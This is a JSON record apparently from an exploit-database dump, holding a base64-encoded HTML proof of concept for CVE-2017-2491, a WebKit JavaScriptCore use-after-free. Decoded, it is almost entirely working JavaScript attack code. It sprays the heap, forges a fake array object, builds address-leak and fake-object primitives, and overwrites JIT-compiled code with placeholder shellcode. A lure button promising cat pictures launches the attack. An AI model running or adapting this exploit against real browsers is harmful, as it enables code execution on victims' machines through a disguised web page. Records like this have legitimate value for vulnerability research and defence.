{
    "source": "exploit-database", 
    "exploit": "PCEtLQ0KU291cmNlczogDQpodHRwczovL3Bob2VuaGV4LnJlLzIwMTctMDUtMDQvcHduMm93bjE3LWNhY2hlZGNhbGwtdWFmDQpodHRwczovL2dpdGh1Yi5jb20vcGhvZW5oZXgvZmlsZXMvYmxvYi9tYXN0ZXIvZXhwbG9pdHMvY2FjaGVkY2FsbC11YWYuaHRtbA0KDQpPdmVydmlldw0KVGhlIFdlYktpdCBidWcgd2UgdXNlZCBhdCBQd24yT3duIGlzIENWRS0yMDE3LTI0OTEgLyBaREktMTctMjMxLCBhIHVzZS1hZnRlci1mcmVlIG9mIGEgSlNTdHJpbmcgb2JqZWN0IGluIEphdmFTY3JpcHRDb3JlLiBCeSB0cmlnZ2VyaW5nIGl0LCB3ZSBjYW4gb2J0YWluIGEgZGFuZ2xpbmcgcG9pbnRlciB0byBhIEpTU3RyaW5nIG9iamVjdCBpbiBhIEphdmFTY3JpcHQgY2FsbGJhY2suIEF0IGZpcnN0LCB0aGUgc3BlY2lmaWMgc2NlbmFyaW8gc2VlbXMgdmVyeSBoYXJkIHRvIGV4cGxvaXQsIGJ1dCB3ZSBmb3VuZCBhIHJhdGhlciBnZW5lcmljIHRlY2huaXF1ZSB0byBzdGlsbCBnZXQgYSByZWxpYWJsZSByZWFkL3dyaXRlIHByaW1pdGl2ZSBvdXQgb2YgaXQsIGFsdGhvdWdoIGl0IHJlcXVpcmVzIGEgdmVyeSBsYXJnZSAofjI4IEdpQikgaGVhcCBzcHJheS4gVGhpcyBpcyBwb3NzaWJsZSBldmVuIG9uIGEgTWFjQm9vayB3aXRoIDggR0Igb2YgUkFNIHRoYW5rcyB0byB0aGUgcGFnZSBjb21wcmVzc2lvbiBtZWNoYW5pc20gaW4gbWFjT1MuDQoNCi0tPg0KDQo8c2NyaXB0Pg0KDQpmdW5jdGlvbiBtYWtlX2NvbXBpbGVkX2Z1bmN0aW9uKCkgew0KICAgIGZ1bmN0aW9uIHRhcmdldCh4KSB7DQogICAgICAgIHJldHVybiB4KjUgKyB4IC0geCp4Ow0KICAgIH0NCiAgICAvLyBDYWxsIG9ubHkgb25jZSBzbyB0aGF0IGZ1bmN0aW9uIGdldHMgY29tcGlsZWQgd2l0aCBsb3cgbGV2ZWwgaW50ZXJwcmV0ZXINCiAgICAvLyBidXQgbm9uZSBvZiB0aGUgb3B0aW1pemluZyBKSVRzDQogICAgdGFyZ2V0KDApOw0KICAgIHJldHVybiB0YXJnZXQ7DQp9DQoNCmZ1bmN0aW9uIHB3bigpIHsNCiAgICB2YXIgaGF4cyA9IG5ldyBBcnJheSgweDEwMCk7DQogICAgZm9yICh2YXIgaSA9IDA7IGkgPCAweDEwMDsgKytpKQ0KICAgICAgICBoYXhzW2ldID0gbmV3IFVpbnQ4QXJyYXkoMHgxMDApOw0KDQogICAgLy8gaGF4IGlzIHN1cnJvdW5kZWQgYnkgb3RoZXIgVWludDhBcnJheSBpbnN0YW5jZXMuIFRodXMgKigmaGF4IC0gOCkgPT0gMHgxMDAsDQogICAgLy8gd2hpY2ggaXMgdGhlIGJ1dHRlcmZseSBsZW5ndGggaWYgaGF4IGlzIGxhdGVyIHVzZWQgYXMgYSBidXR0ZXJmbHkgZm9yIGENCiAgICAvLyBmYWtlIEpTQXJyYXkuDQogICAgdmFyIGhheCA9IGhheHNbMHg4MF07DQogICAgdmFyIGhheDIgPSBoYXhzWzB4ODFdOw0KDQogICAgdmFyIHRhcmdldF9mdW5jID0gbWFrZV9jb21waWxlZF9mdW5jdGlvbigpOw0KDQogICAgLy8gU21hbGwgaGVscGVyIHRvIGF2b2lkIGFsbG9jYXRpb25zIHdpdGggLnNldCgpLCBzbyB3ZSBkb24ndCBtZXNzIHVwIHRoZSBoZWFwDQogICAgZnVuY3Rpb24gc2V0KHAsIGksIGEsYixjLGQsZSxmLGcsaCkgew0KICAgICAgICBwW2krMF09YTsgcFtpKzFdPWI7IHBbaSsyXT1jOyBwW2krM109ZDsgcFtpKzRdPWU7IHBbaSs1XT1mOyBwW2krNl09ZzsgcFtpKzddPWg7DQogICAgfQ0KDQogICAgZnVuY3Rpb24gc3ByYXkoKSB7DQogICAgICAgIHZhciByZXMgPSBuZXcgVWludDhBcnJheSgweDdmZmZmMDAwKTsNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCAweDdmZmZmMDAwOyBpICs9IDB4MTAwMCkgew0KICAgICAgICAgICAgLy8gV3JpdGUgaGVhcCBwYXR0ZXJuLg0KICAgICAgICAgICAgLy8gV2Ugb25seSBuZWVkIGEgc3RydWN0dXJlIHBvaW50ZXIgZXZlcnkgMTI4IGJ5dGVzLCBidXQgYWxzbyBzb21lIG9mDQogICAgICAgICAgICAvLyBzdHJ1Y3R1cmUgZmllbGRzIG5lZWQgdG8gYmUgIT0gMCBhbmQgSSBjYW4ndCByZW1lbWJlciB3aGljaCwgc28gd2UganVzdA0KICAgICAgICAgICAgLy8gd3JpdGUgcG9pbnRlcnMgZXZlcnl3aGVyZS4NCiAgICAgICAgICAgIGZvciAodmFyIGogPSAwOyBqIDwgMHgxMDAwOyBqICs9IDgpDQogICAgICAgICAgICAgICAgc2V0KHJlcywgaSArIGosIDB4MDgsIDAsIDAsIDB4NTAsIDB4MDEsIDAsIDAsIDApOw0KDQogICAgICAgICAgICAvLyBXcml0ZSB0aGUgb2Zmc2V0IHRvIHRoZSBiZWdpbm5pbmcgb2YgZWFjaCBwYWdlIHNvIHdlIGtub3cgbGF0ZXINCiAgICAgICAgICAgIC8vIHdpdGggd2hpY2ggcGFydCB3ZSBvdmVybGFwLg0KICAgICAgICAgICAgdmFyIGogPSBpKzErMio4Ow0KICAgICAgICAgICAgc2V0KHJlcywgaiwgaiYweGZmLCAoaj4+OCkmMHhmZiwgKGo+PjE2KSYweGZmLCAoaj4+MjQpJjB4ZmYsIDAsIDAsIDB4ZmYsIDB4ZmYpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiByZXM7DQogICAgfQ0KDQogICAgLy8gU3ByYXkgfjE0IEdpQiB3b3J0aCBvZiBhcnJheSBidWZmZXJzIHdpdGggb3VyIHBhdHRlcm4uDQogICAgdmFyIHggPSBbDQogICAgICAgIHNwcmF5KCksIHNwcmF5KCksIHNwcmF5KCksIHNwcmF5KCksDQogICAgICAgIHNwcmF5KCksIHNwcmF5KCksIHNwcmF5KCksIHNwcmF5KCksDQogICAgXTsNCg0KICAgIC8vIFRoZSBidXR0ZXJmbHkgb2Ygb3VyIGZha2Ugb2JqZWN0IHdpbGwgcG9pbnQgdG8gMHgyMDAwMDAwMDEuIFRoaXMgd2lsbCBhbHdheXMNCiAgICAvLyBiZSBpbnNpZGUgdGhlIHNlY29uZCBzcHJheWVkIGJ1ZmZlci4NCiAgICB2YXIgYnVmID0geFsxXTsNCg0KICAgIC8vIEEgYmlnIGFycmF5IHRvIGhvbGQgcmVmZXJlbmNlIHRvIG9iamVjdHMgd2UgZG9uJ3Qgd2FudCB0byBiZSBmcmVlZC4NCiAgICB2YXIgYXJ5ID0gbmV3IEFycmF5KDB4MTAwMDAwMDApOw0KICAgIHZhciBjbnQgPSAwOw0KDQogICAgLy8gU2V0IHVwIG9iamVjdHMgd2UgbmVlZCB0byB0cmlnZ2VyIHRoZSBidWcuDQogICAgdmFyIG4gPSAweDQwMDAwOw0KICAgIHZhciBtID0gMTA7DQogICAgdmFyIHJlZ2V4ID0gbmV3IFJlZ0V4cCgiKGFiKSIucmVwZWF0KG4pLCAiZyIpOw0KICAgIHZhciBwYXJ0ID0gImFiIi5yZXBlYXQobik7DQogICAgdmFyIHMgPSAocGFydCArICJ8IikucmVwZWF0KG0pOw0KDQogICAgLy8gU2V0IHVwIHNvbWUgdmlld3MgdG8gY29udmVydCBwb2ludGVycyB0byBkb3VibGVzDQogICAgdmFyIGNvbnZlcnQgPSBuZXcgQXJyYXlCdWZmZXIoMHgyMCk7DQogICAgdmFyIGN1ID0gbmV3IFVpbnQ4QXJyYXkoY29udmVydCk7DQogICAgdmFyIGNmID0gbmV3IEZsb2F0NjRBcnJheShjb252ZXJ0KTsNCg0KICAgIC8vIENvbnN0cnVjdCBmYWtlIEpTQ2VsbCBoZWFkZXINCiAgICBzZXQoY3UsIDAsDQogICAgICAgIDAsMCwwLDAsICAvLyBzdHJ1Y3R1cmUgSUQNCiAgICAgICAgOCwgICAgICAgIC8vIGluZGV4aW5nIHR5cGUNCiAgICAgICAgMCwwLDApOyAgIC8vIHNvbWUgbW9yZSBzdHVmZiB3ZSBkb24ndCBjYXJlIGFib3V0DQoNCiAgICB2YXIgY29udGFpbmVyID0gew0KICAgICAgICAvLyBJbmxpbmUgb2JqZWN0IHdpdGggaW5kZWJ1Zm5nIHR5cGUgOCBhbmQgYnV0dGVybHkgcG9pbnRpbmcgdG8gaGF4Lg0KICAgICAgICAvLyBMYXRlciB3ZSB3aWxsIHJlZmVyIHRvIGl0IGFzIGZha2VhcnJheS4NCiAgICAgICAganNDZWxsSGVhZGVyOiBjZlswXSwNCiAgICAgICAgYnV0dGVyZmx5OiBoYXgsDQogICAgfTsNCg0KICAgIHdoaWxlICgxKSB7DQogICAgICAgIC8vIFRyeSB0byB0cmlnZ2VyIGJ1Zw0KICAgICAgICBzLnJlcGxhY2UocmVnZXgsIGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgZm9yICh2YXIgaSA9IDE7IGkgPCBhcmd1bWVudHMubGVuZ3RoLTI7ICsraSkgew0KICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgYXJndW1lbnRzW2ldID09PSAnc3RyaW5nJykgew0KICAgICAgICAgICAgICAgICAgICAvLyBSb290IGFsbCB0aGUgY2FsbGJhY2sgYXJndW1lbnRzIHRvIGZvcmNlIEdDIGF0IHNvbWUgcG9pbnQNCiAgICAgICAgICAgICAgICAgICAgYXJ5W2NudCsrXSA9IGFyZ3VtZW50c1tpXTsNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHZhciBhID0gYXJndW1lbnRzW2ldOw0KDQogICAgICAgICAgICAgICAgLy8gYS5idXR0ZXJmbHkgcG9pbnRzIHRvIDB4MjAwMDAwMDAxLCB3aGljaCBpcyBhbHdheXMNCiAgICAgICAgICAgICAgICAvLyBpbnNpZGUgYnVmLCBidXQgd2UgYXJlIG5vdCBzdXJlIHdoYXQgdGhlIGV4YWN0DQogICAgICAgICAgICAgICAgLy8gb2Zmc2V0IGlzIHdpdGhpbiBpdCBzbyB3ZSByZWFkIGEgbWFya2VyIHZhbHVlLg0KICAgICAgICAgICAgICAgIHZhciBvZmZzZXQgPSBhWzJdOw0KDQogICAgICAgICAgICAgICAgLy8gQ29tcHV0ZSBhZGRyb2YoY29udGFpbmVyKSArIDE2LiBXZSB3cml0ZSB0byB0aGUgZmFrZSBhcnJheSwgdGhlbg0KICAgICAgICAgICAgICAgIC8vIHJlYWQgZnJvbSBhIHNwcmF5ZWQgYXJyYXkgYnVmZmVyIG9uIHRoZSBoZWFwLg0KICAgICAgICAgICAgICAgIGFbMl0gPSBjb250YWluZXI7DQogICAgICAgICAgICAgICAgdmFyIGFkZHIgPSAwOw0KICAgICAgICAgICAgICAgIGZvciAodmFyIGogPSA3OyBqID49IDA7IC0taikNCiAgICAgICAgICAgICAgICAgICAgYWRkciA9IGFkZHIqMHgxMDAgKyBidWZbb2Zmc2V0ICsgal07DQoNCiAgICAgICAgICAgICAgICAvLyBBZGQgMTYgdG8gZ2V0IGFkZHJlc3Mgb2YgaW5saW5lIG9iamVjdA0KICAgICAgICAgICAgICAgIGFkZHIgKz0gMTY7DQoNCiAgICAgICAgICAgICAgICAvLyBEbyB0aGUgaW52ZXJzZSB0byBnZXQgZmFrZW9iaihhZGRyKQ0KICAgICAgICAgICAgICAgIGZvciAodmFyIGogPSAwOyBqIDwgODsgKytqKSB7DQogICAgICAgICAgICAgICAgICAgIGJ1ZltvZmZzZXQgKyBqXSA9IGFkZHIgJiAweGZmOw0KICAgICAgICAgICAgICAgICAgICBhZGRyIC89IDB4MTAwOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB2YXIgZmFrZWFycmF5ID0gYVsyXTsNCg0KICAgICAgICAgICAgICAgIC8vIFJlLXdyaXRlIHRoZSB2ZWN0b3IgcG9pbnRlciBvZiBoYXggdG8gcG9pbnQgdG8gaGF4Mi4NCiAgICAgICAgICAgICAgICBmYWtlYXJyYXlbMl0gPSBoYXgyOw0KDQogICAgICAgICAgICAgICAgLy8gQXQgdGhpcyBwb2ludCBoYXgudmVjdG9yIHBvaW50cyB0byBoYXgyLCBzbyB3ZSBjYW4gd3JpdGUNCiAgICAgICAgICAgICAgICAvLyB0aGUgdmVjdG9yIHBvaW50ZXIgb2YgaGF4MiBieSB3cml0aW5nIHRvIGhheFsxNit7MC4uN31dDQoNCiAgICAgICAgICAgICAgICAvLyBMZWFrIGFkZHJlc3Mgb2YgSlNGdW5jdGlvbg0KICAgICAgICAgICAgICAgIGFbMl0gPSB0YXJnZXRfZnVuYzsNCiAgICAgICAgICAgICAgICBhZGRyID0gMDsNCiAgICAgICAgICAgICAgICBmb3IgKHZhciBqID0gNzsgaiA+PSAwOyAtLWopDQogICAgICAgICAgICAgICAgICAgIGFkZHIgPSBhZGRyKjB4MTAwICsgYnVmW29mZnNldCArIGpdOw0KDQogICAgICAgICAgICAgICAgLy8gRm9sbG93IGEgYnVuY2ggb2YgcG9pbnRlcnMgdG8gUldYIGxvY2F0aW9uIGNvbnRhaW5pbmcgdGhlDQogICAgICAgICAgICAgICAgLy8gZnVuY3Rpb24ncyBjb21waWxlZCBjb2RlDQogICAgICAgICAgICAgICAgYWRkciArPSAzKjg7DQogICAgICAgICAgICAgICAgZm9yICh2YXIgaiA9IDA7IGogPCA4OyArK2opIHsNCiAgICAgICAgICAgICAgICAgICAgaGF4WzE2K2pdID0gYWRkciAmIDB4ZmY7DQogICAgICAgICAgICAgICAgICAgIGFkZHIgLz0gMHgxMDA7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGFkZHIgPSAwOw0KICAgICAgICAgICAgICAgIGZvciAodmFyIGogPSA3OyBqID49IDA7IC0taikNCiAgICAgICAgICAgICAgICAgICAgYWRkciA9IGFkZHIqMHgxMDAgKyBoYXgyW2pdOw0KDQogICAgICAgICAgICAgICAgYWRkciArPSAzKjg7DQogICAgICAgICAgICAgICAgZm9yICh2YXIgaiA9IDA7IGogPCA4OyArK2opIHsNCiAgICAgICAgICAgICAgICAgICAgaGF4WzE2K2pdID0gYWRkciAmIDB4ZmY7DQogICAgICAgICAgICAgICAgICAgIGFkZHIgLz0gMHgxMDA7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGFkZHIgPSAwOw0KICAgICAgICAgICAgICAgIGZvciAodmFyIGogPSA3OyBqID49IDA7IC0taikNCiAgICAgICAgICAgICAgICAgICAgYWRkciA9IGFkZHIqMHgxMDAgKyBoYXgyW2pdOw0KDQogICAgICAgICAgICAgICAgYWRkciArPSA0Kjg7DQogICAgICAgICAgICAgICAgZm9yICh2YXIgaiA9IDA7IGogPCA4OyArK2opIHsNCiAgICAgICAgICAgICAgICAgICAgaGF4WzE2K2pdID0gYWRkciAmIDB4ZmY7DQogICAgICAgICAgICAgICAgICAgIGFkZHIgLz0gMHgxMDA7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGFkZHIgPSAwOw0KICAgICAgICAgICAgICAgIGZvciAodmFyIGogPSA3OyBqID49IDA7IC0taikNCiAgICAgICAgICAgICAgICAgICAgYWRkciA9IGFkZHIqMHgxMDAgKyBoYXgyW2pdOw0KDQogICAgICAgICAgICAgICAgLy8gV3JpdGUgc2hlbGxjb2RlDQogICAgICAgICAgICAgICAgZm9yICh2YXIgaiA9IDA7IGogPCA4OyArK2opIHsNCiAgICAgICAgICAgICAgICAgICAgaGF4WzE2K2pdID0gYWRkciAmIDB4ZmY7DQogICAgICAgICAgICAgICAgICAgIGFkZHIgLz0gMHgxMDA7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGhheDJbMF0gPSAweGNjOw0KICAgICAgICAgICAgICAgIGhheDJbMV0gPSAweGNjOw0KICAgICAgICAgICAgICAgIGhheDJbMl0gPSAweGNjOw0KDQogICAgICAgICAgICAgICAgLy8gUHduLg0KICAgICAgICAgICAgICAgIHRhcmdldF9mdW5jKCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gIngiOw0KICAgICAgICB9KTsNCiAgICB9DQp9DQo8L3NjcmlwdD4NCg0KPGJ1dHRvbiBvbmNsaWNrPSJwd24oKSI+Y2xpY2sgaGVyZSBmb3IgY3V0ZSBjYXQgcGljeiE8L2J1dHRvbj4=", 
    "filename": "platforms/macos/remote/41964.html", 
    "id": "41964", 
    "cves": [
        "CVE-2017-2491"
    ]
}